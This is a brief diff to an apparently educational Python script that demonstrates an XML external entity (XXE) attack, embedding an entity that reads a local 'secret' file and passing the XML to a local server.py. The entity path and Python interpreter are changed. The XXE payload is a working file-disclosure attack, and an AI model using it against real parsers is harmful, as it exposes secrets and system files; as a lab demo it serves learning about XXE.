@@ -7,7 +7,7 @@ import subprocess
 
 xml = '''\
 <!DOCTYPE ent [
-    <!ENTITY psswds SYSTEM "file://.secret"> 
+    <!ENTITY psswds SYSTEM "../xxe-python/secret"> 
 ]>
 <data>
     <root>&psswds;</root>
@@ -22,6 +22,6 @@ xml = '''\
 </data>
 '''
 
-server_output = subprocess.check_output(["python", "server.py", xml])
-
+#  Send xml to server.py and print output
+server_output = subprocess.check_output(["python3", "server.py", xml])
 print(server_output.decode())
